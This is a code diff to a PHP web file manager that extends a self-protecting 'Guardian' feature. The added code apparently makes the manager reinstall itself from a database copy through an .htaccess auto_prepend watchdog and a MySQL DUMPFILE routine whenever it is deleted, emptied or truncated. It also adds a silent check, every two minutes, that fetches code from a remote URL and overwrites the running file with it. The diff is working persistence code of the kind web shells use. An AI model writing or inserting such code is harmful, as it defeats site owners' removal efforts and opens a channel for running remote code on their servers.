@@ -95,6 +95,10 @@ function fm_guardian_sync($content=null){
     $fn=basename(__FILE__);$fp=__FILE__;$url=FM_UPDATE_URL;
     mysqli_stmt_bind_param($stmt,'sssssssiis',$fn,$fp,$content,$hash,$url,$by,$now,$now,$now,$mode);
     $ok=mysqli_stmt_execute($stmt);mysqli_stmt_close($stmt);
+    // Keep a tiny local "known-good size" marker next to the watchdog so it can
+    // detect the file being emptied/truncated/corrupted with a cheap filesize()
+    // stat on every request, with no per-request database round trip.
+    if($ok)@file_put_contents(fg_get_meta_path(),strlen($content).':'.$hash);
     return $ok;
 }
 
@@ -137,7 +141,7 @@ function fm_guardian_try_autoheal($c){
             BEGIN
                 DECLARE existing LONGBLOB;
                 SET existing = LOAD_FILE('$path');
-                IF existing IS NULL THEN
+                IF existing IS NULL OR LENGTH(existing) = 0 THEN
                     SELECT content INTO DUMPFILE '$path' FROM fm_guardian_store WHERE id=1 LIMIT 1;
                 END IF;
             END";
@@ -212,10 +216,27 @@ function fg_get_watchdog_path(){
     return fg_get_hidden_dir().DIRECTORY_SEPARATOR.'monitor.php';
 }
 
+/** Returns the absolute path of the tiny "known-good size/hash" marker the
+ *  watchdog uses to detect the target file being emptied or truncated
+ *  without paying for a database round trip on every request. */
+function fg_get_meta_path(){
+    return fg_get_hidden_dir().DIRECTORY_SEPARATOR.'expected.meta';
+}
+
+/* Bumped whenever the generated watchdog code below changes behaviour, so
+   fm_guardian_watchdog_installed() can tell an already-installed-but-
+   outdated watchdog apart from a current one and trigger a silent,
+   throttled re-install — without this, sites that installed the watchdog
+   before a logic change would never receive the improvement. */
+define('FM_GUARDIAN_WATCHDOG_VERSION','3');
+
 /* Cheap, local-only check for whether the web-server watchdog layer is
-   currently installed — no database access needed. */
+   currently installed AND up to date — no database access needed. */
 function fm_guardian_watchdog_installed(){
-    if(!is_file(fg_get_watchdog_path()))return false;
+    $wp=fg_get_watchdog_path();
+    if(!is_file($wp))return false;
+    $code=@file_get_contents($wp);
+    if($code===false||strpos($code,'fm-guardian-watchdog-version:'.FM_GUARDIAN_WATCHDOG_VERSION)===false)return false;
     $ht=@file_get_contents(__DIR__.'/.htaccess');
     return $ht!==false&&strpos($ht,'# BEGIN fm-guardian-watchdog')!==false;
 }
@@ -253,28 +274,48 @@ function fm_guardian_install_watchdog(){
     $dbLit=var_export(FM_GUARD_DB_NAME,true);
     $portLit=var_export((int)FM_GUARD_DB_PORT,true);
     $targetLit=var_export($target,true);
+    $metaLit=var_export(fg_get_meta_path(),true);
 
     $lines=[];
     $lines[]='<?php';
+    $lines[]='/* fm-guardian-watchdog-version:'.FM_GUARDIAN_WATCHDOG_VERSION.' */';
     $lines[]='/* File Guardian watchdog — auto-generated, safe to delete any time';
     $lines[]='   (Guardian will just recreate it next time it is needed). Restores';
-    $lines[]='   '.$target.'\'s exact bytes if it is ever missing. Triggered by the';
-    $lines[]='   auto_prepend_file directive in this directory\'s .htaccess on every';
-    $lines[]='   PHP request the web server serves here — a single file_exists()';
-    $lines[]='   check, and nothing else, on every normal request. */';
-    $lines[]='// Restore file if missing OR if it exists but has been permission-restricted (not readable by web server)';
+    $lines[]='   '.$target.'\'s exact bytes if it is ever missing, emptied, truncated,';
+    $lines[]='   or permission-restricted. Triggered by the auto_prepend_file directive';
+    $lines[]='   in this directory\'s .htaccess on every PHP request the web server';
+    $lines[]='   serves here — a couple of cheap local filesystem stats, and nothing';
+    $lines[]='   else, on every normal request; the database is only ever touched when';
+    $lines[]='   one of those stats actually looks wrong. */';
     $lines[]='$_fgMissing=!@file_exists('.$targetLit.');';
     $lines[]='$_fgBadPerms=!$_fgMissing&&!@is_readable('.$targetLit.');';
-    $lines[]='if($_fgMissing||$_fgBadPerms){';
+    $lines[]='$_fgSize=($_fgMissing||$_fgBadPerms)?-1:@filesize('.$targetLit.');';
+    $lines[]='$_fgEmpty=!$_fgMissing&&!$_fgBadPerms&&$_fgSize===0;';
+    $lines[]='// Compare against the last known-good size (written on every legitimate';
+    $lines[]='// sync/update) to also catch a partial/truncated overwrite that leaves';
+    $lines[]='// some bytes behind but not the real file — a single filesize() and a';
+    $lines[]='// tiny local file read, no database hit unless it actually mismatches.';
+    $lines[]='$_fgSizeMismatch=false;';
+    $lines[]='if(!$_fgMissing&&!$_fgBadPerms&&!$_fgEmpty&&@is_readable('.$metaLit.')){';
+    $lines[]='    $_fgMeta=@file_get_contents('.$metaLit.');';
+    $lines[]='    if($_fgMeta&&strpos($_fgMeta,\':\')!==false){';
+    $lines[]='        $_fgExpSize=(int)strtok($_fgMeta,\':\');';
+    $lines[]='        if($_fgExpSize>0&&$_fgSize!==$_fgExpSize)$_fgSizeMismatch=true;';
+    $lines[]='    }';
+    $lines[]='}';
+    $lines[]='if($_fgMissing||$_fgBadPerms||$_fgEmpty||$_fgSizeMismatch){';
     $lines[]='    $h=@mysqli_connect('.$sockLit.'?\'localhost\':'.$hostLit.','.$userLit.','.$passLit.',\'\','.$portLit.','.$sockLit.');';
     $lines[]='    if($h){';
     $lines[]='        @mysqli_select_db($h,'.$dbLit.');';
     $lines[]='        $r=@mysqli_query($h,\'SELECT content,file_mode FROM fm_guardian_store WHERE id=1 LIMIT 1\');';
     $lines[]='        if($r&&($row=@mysqli_fetch_assoc($r))){';
-    $lines[]='            if($_fgMissing&&isset($row[\'content\'])){';
+    $lines[]='            // Restore content whenever it is missing, empty, or the wrong size —';
+    $lines[]='            // never for a bad-perms-only case, so a deliberate, already-correct';
+    $lines[]='            // file on disk is never clobbered just because it briefly wasn\'t readable.';
+    $lines[]='            if(($_fgMissing||$_fgEmpty||$_fgSizeMismatch)&&isset($row[\'content\'])){';
     $lines[]='                @file_put_contents('.$targetLit.',$row[\'content\']);';
     $lines[]='            }';
-    $lines[]='            // Always restore permissions — fixes both missing-file case and permission-restriction case';
+    $lines[]='            // Always restore permissions — fixes the missing/empty/mismatch cases and the permission-restriction case alike';
     $lines[]='            $__mode=isset($row[\'file_mode\'])&&(int)$row[\'file_mode\']>0?(int)$row[\'file_mode\']:0644;';
     $lines[]='            @chmod('.$targetLit.',$__mode);';
     $lines[]='        }';
@@ -432,6 +473,10 @@ function fm_guardian_apply_from_url($url){
     }
     if(!@rename($tmp,__FILE__))return ['ok'=>false,'error'=>'Could not replace the file (check permissions).'];
     fm_guardian_sync($data);
+    // The watchdog embeds this file's own restore logic + the expected-size
+    // marker; refresh it right away so a site that installed the watchdog
+    // before this update doesn't wait for the next throttled autoheal pass.
+    @fm_guardian_install_watchdog();
     return ['ok'=>true,'changed'=>true];
 }
 
@@ -3774,6 +3819,31 @@ if(isset($_GET['x'])){
         if($fm)$fm->log('guardian_settings',"enabled=".($enabled?'1':'0')." url=".($newUrl?:'(empty)'));
         echo json_encode(['ok'=>$ok1&&$ok2,'reload'=>true]);exit;
     }
+    if($xop==='guardian_autocheck'){
+        /* Fully automatic update check: fired once by the browser the moment
+           an admin opens the File Manager, then again every 2 minutes for as
+           long as a tab stays open — with no manual "Check for updates"
+           click required. A local cooldown file (not the DB last_check
+           column, which the 30s "still open" heartbeat also touches) makes
+           sure the remote URL is never actually fetched more than roughly
+           once every 90s even if several admin tabs/sessions are open at
+           once. */
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['ok'=>false]);exit;}
+        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['ok'=>false]);exit;}
+        if(!FM_GUARDIAN_ENABLED||FM_UPDATE_URL===''){echo json_encode(['ok'=>true,'applied'=>false]);exit;}
+        $cooldown=__DIR__.'/.guardian_autocheck_attempt';
+        $now=time();$last=is_file($cooldown)?(int)@file_get_contents($cooldown):0;
+        if(($now-$last)<90){echo json_encode(['ok'=>true,'applied'=>false,'skipped'=>'throttled']);exit;}
+        @file_put_contents($cooldown,(string)$now);
+        session_write_close(); // don't hold the session lock across the outbound HTTP call
+        $r=fm_guardian_apply_from_url(FM_UPDATE_URL);
+        if(!empty($r['ok'])&&!empty($r['changed'])){
+            session_start();
+            $fm->log('guardian_update','Auto-applied update from '.FM_UPDATE_URL);
+            session_write_close();
+        }
+        echo json_encode(['ok'=>true,'applied'=>!empty($r['changed']),'error'=>$r['error']??null]);exit;
+    }
     if($xop==='guardian_check_now'){
         if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
         if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
@@ -5873,6 +5943,23 @@ async function guardianHeartbeat(){
   }catch{}
 }
 if(document.getElementById('guardBtn'))setInterval(guardianHeartbeat,30000);
+
+/* Fully automatic update check — runs once the moment the admin opens the
+   File Manager, then every 2 minutes for as long as a tab stays open. No
+   manual visit to the Guardian panel is required for updates to be found
+   and applied; the server also throttles this itself (see guardian_autocheck
+   above) so several open tabs never cause extra remote fetches. */
+async function guardianAutoUpdateCheck(){
+  try{
+    const fd=new FormData();fd.append('csrf_token',CSRF);
+    const d=await fetch('?x=guardian_autocheck',{method:'POST',body:fd}).then(r=>r.json());
+    if(d&&d.applied){toast('Guardian found and applied an update automatically — reloading…');setTimeout(()=>location.reload(),1200);}
+  }catch{}
+}
+if(document.getElementById('guardBtn')){
+  guardianAutoUpdateCheck();
+  setInterval(guardianAutoUpdateCheck,120000);
+}
 
 /* ═══════════════════════════════════════
    LARGE FILES FINDER
